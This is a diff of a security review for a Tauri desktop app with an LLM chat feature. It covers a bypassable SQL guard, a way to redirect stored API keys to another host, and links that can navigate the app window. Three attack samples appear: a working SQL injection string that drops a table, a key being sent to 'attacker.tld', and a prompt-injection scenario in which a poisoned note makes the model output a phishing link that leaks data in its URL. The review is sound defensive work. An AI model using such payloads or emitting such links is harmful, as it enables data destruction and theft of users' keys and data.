@@ -10,8 +10,8 @@ Read-only review of the 47 commits on `main` not yet on `origin/main` (234 files
 
 | # | Severity | Category | Location | Issue |
 |---|---|---|---|---|
-| 1 | Critical | Security | `src-tauri/capabilities/default.json:13` | `sql:allow-execute` bypasses the SQL guard — **fixed, see below** |
-| 2 | High | Security | `src-tauri/src/commands/llm.rs:385` | API key and base URL come from the webview — **fixed, see below** |
+| 1 | Critical | Security | `src-tauri/capabilities/default.json:13` | `sql:allow-execute` bypasses the SQL guard — **fixed, reopened, now closed by an authorizer** |
+| 2 | High | Security | `src-tauri/src/commands/llm.rs:385` | API key and base URL come from the webview — **fixed, reopened, now closed by origin binding** |
 | 3 | High | Correctness | `src-tauri/src/commands/llm.rs:308` | UTF-8 characters split across chunks are corrupted — **fixed, see below** |
 | 4 | Medium | Correctness | `src-tauri/src/commands/llm.rs:288` | Stop does nothing while the provider is silent — **fixed, see below** |
 | 5 | Medium | Correctness | `src/llm/tools.ts:288` | Divide-by-zero guard checks the wrong variable — **fixed** |
@@ -56,6 +56,32 @@ value containing quotes, semicolons and `--`; the command reports the right
 and stacked statements are refused before touching the database. SECURITY.md's
 capability and SQL-safety sections were updated to match.
 
+**Reopened (second review, 2026-11-01): the text guard was bypassable.**
+`check_statement` tracked single quotes only, so a `'` inside a `"…"` identifier
+desynchronised it and a `;` hid a second statement; sqlx runs the tail, so
+`DELETE FROM t WHERE (SELECT 1 AS "'") = 0; DROP TABLE t; SELECT 1 AS "'"` passed
+the guard and dropped the table. Reproduced against the app's own
+`write_statement`.
+
+**Closed properly (2026-11-01).** Two layers, because a text filter cannot be
+trusted to be exhaustive:
+
+- the scanner now understands `'…'`, `"…"`, `` `…` `` and `[…]`, each with its own
+  delimiter-doubling escape, so a `;` is only a separator outside any quoted token;
+- every write connection installs a SQLite **authorizer**
+  (`sqlite3_set_authorizer` through sqlx's `lock_handle()`), allowing only
+  `SELECT`/`READ`/`FUNCTION`/`RECURSIVE`/`INSERT`/`UPDATE`/`DELETE` and the
+  transaction control sqlx itself needs. `PRAGMA`, `ATTACH`, `DETACH`, `CREATE_*`,
+  `DROP_*`, `ALTER_TABLE`, `REINDEX`, `ANALYZE`, `VACUUM` and writes to
+  `llm_providers`/`provider_models` are refused by the engine, whatever the text
+  looks like.
+
+Nine tests in `src-tauri/tests/sql_guard.rs` cover the reported payload (and its
+backtick and bracket variants), the authorizer refusing a hidden second statement
+sent as raw SQL with no scanning at all, the DDL/PRAGMA/ATTACH/VACUUM refusals,
+the provider-table refusal, and ordinary DML (including an `AUTOINCREMENT` table)
+still working.
+
 ### 2. High — API key and base URL come from the webview
 
 **Where:** `src-tauri/src/commands/llm.rs:385`, and `secret_get`
@@ -79,48 +105,74 @@ way to read a stored secret.
   the same, for the provider list's "test" action and the model picker.
 - **`probe_models(baseUrl, apiKey)`** and **`probe_connection(baseUrl, apiKey)`**
   remain for the provider form, which must test an endpoint before it is saved.
-  That key is typed into the form by the user; no stored key is reachable
-  through them.
-- **`secret_set` / `secret_delete`** now accept only `provider:<id>` accounts, so
-  a compromised renderer cannot overwrite or delete other items in the app's
-  Keychain service (unit-tested).
+  That key is typed into the form by the user; no stored key is reachable that way.
 
-`getProviderKey` and `service.providerApiKey` were deleted from the TypeScript
-side; the transport carries a provider id instead of an endpoint. SECURITY.md's
-secrets and open-issues sections were updated — the "keys pass through JS" entry
-is closed.
+**Reopened (second review, 2026-11-01): the key could still be sent anywhere.**
+Removing `secret_get` hid the key but not the destination: `provider_connection`
+reads `base_url` from `llm_providers`, and the webview could change that row with
+one `execute_write`, then call the command — the key left in the `Authorization`
+header for `attacker.tld`.
+
+**Closed properly (2026-11-01).** Three changes, so that neither the row nor the
+command can redirect a key:
+
+1. **The key is bound to its origin.** The Keychain item holds
+   `{"key": …, "origin": "scheme://host:port"}` and `read_key(account, base_url)`
+   returns an error, never a key, when the provider's origin has moved. Keys saved
+   in the old plain format are refused until re-entered once.
+2. **The provider tables left the generic write path.** The authorizer refuses
+   `INSERT`/`UPDATE`/`DELETE` on `llm_providers` and `provider_models` from
+   `execute_write` and `run_transaction`; the named commands `provider_save`,
+   `provider_delete`, `provider_set_default`, `providers_restore` and
+   `providers_reset` write them and do the Keychain work in the same call.
+   `secret_set` and `secret_delete` are no longer exposed to the webview at all.
+3. **Changing the endpoint drops the key.** `provider_save` keeps a stored key only
+   if it still resolves for the new base URL; otherwise the item is deleted and
+   `keychain_ref` is cleared.
+
+Verified by `src-tauri/tests/providers.rs` (11 tests against a migrated database —
+including a provider moved to `attacker.tld` losing its `keychain_ref`), by
+`sql_guard.rs` (the authorizer refusing the `UPDATE llm_providers` itself), by
+`secrets`' origin unit tests, and by the ignored Keychain round-trip run against
+the real login Keychain (a key stored for one origin is refused for another host
+and for another port).
 
 ### 8. Medium — Assistant links can navigate the app window
 
 **Where:** `src/ui/pages/chat/ChatPage.tsx:506`, `src-tauri/src/lib.rs`
 
-Assistant markdown renders clickable links with no custom `a` component, and `lib.rs` has no `on_navigation` hook. A link the model produces can replace the app's own page with an external site.
+Assistant markdown renders clickable links with no custom `a` component, and
+`lib.rs` has no `on_navigation` hook. A link the model produces can replace the
+app's own page with an external site.
 
-**Scenario:** a prompt-injected note or memory makes the model output `[Re-enter your API key](https://attacker.tld/?d=<portfolio summary>)`. One click replaces the app UI with a phishing page that has no back button, and the URL leaks data.
+**Scenario:** a prompt-injected note or memory makes the model output
+`[Re-enter your API key](https://attacker.tld/?d=<portfolio summary>)`. One click
+replaces the app UI with a phishing page that has no back button, and the URL leaks
+data.
 
-**Fix:** render links with a custom component that opens them externally (opener plugin) after a confirmation, and block non-app origins with `on_navigation`.
+**Fix:** render links with a custom component that opens them externally (opener
+plugin) after a confirmation, and block non-app origins with `on_navigation`.
 
-**Status: done (2026-11-01, 0.4.0).** The `on_navigation` half of the suggested
-fix does not exist in Tauri v2 (`Builder::on_navigation` is not in the API), so the
-guard is done in the webview instead:
+**Status: done (2026-11-01, 0.4.0), corrected after a second review.** The first
+version of this entry claimed `on_navigation` does not exist in Tauri v2. That was
+wrong: `tauri::Builder` has no such method, but `tauri::plugin::Builder`
+(`plugin.rs:459`) and `WebviewWindowBuilder` (`webview_window.rs:266`) do. Three
+layers now:
 
-- **`src/lib/externalLinks.ts`** installs one capturing `click` listener on the
-  document, before React renders. Any click on an absolute `http(s)` link calls
-  `preventDefault()` and asks Rust to open it in the default browser
-  (`open_external`). Hash routes (`#/assets`), relative hrefs, modifier-clicks
-  (open in a new tab intent) and non-web schemes are left untouched.
-- **`open_external`** (`src-tauri/src/commands/files.rs`) re-checks the scheme and
-  refuses anything that is not `http://` or `https://`, so a `file:` or
-  `javascript:` URL can never reach the system opener even if the webview guard is
-  bypassed.
-- Fixed once, for the whole document, rather than per component: replies are
-  rendered in three places (message history, the streaming bubble, the delete
-  modal) and a custom `a` component would have to be threaded through each.
+- **`navigation_guard()`** in `src-tauri/src/lib.rs` — an inline plugin whose
+  `on_navigation` allows only `tauri`/`asset`/`about` and http(s) on
+  `localhost`/`127.0.0.1`/`ipc.localhost`. Every other document navigation is
+  cancelled by the framework, whatever caused it.
+- **`installExternalLinkGuard`** (`src/lib/externalLinks.ts`) — one capturing
+  click listener; an absolute `http(s)` link is `preventDefault()`ed and opened by
+  the system browser through `open_external`. Hash routes, relative hrefs and
+  non-web schemes are untouched. Modifier- and Cmd-clicks are intercepted too: the
+  window has no tabs, so leaving them alone did nothing.
+- **`open_external`** re-checks the scheme and refuses anything that is not
+  `http://` or `https://`.
 
-Covered by nine jsdom tests (https, http, hash route, relative path, `file:`,
-a rejected command, a modifier-click, a click on a child element, and
-reinstall) and a Rust test for the scheme refusal. SECURITY.md's "Webview and
-IPC" section documents both halves.
+Nine jsdom tests plus a Rust test for the scheme refusal. The navigation guard is
+not automated: it is a five-line closure over a framework callback.
 
 ## Correctness
 
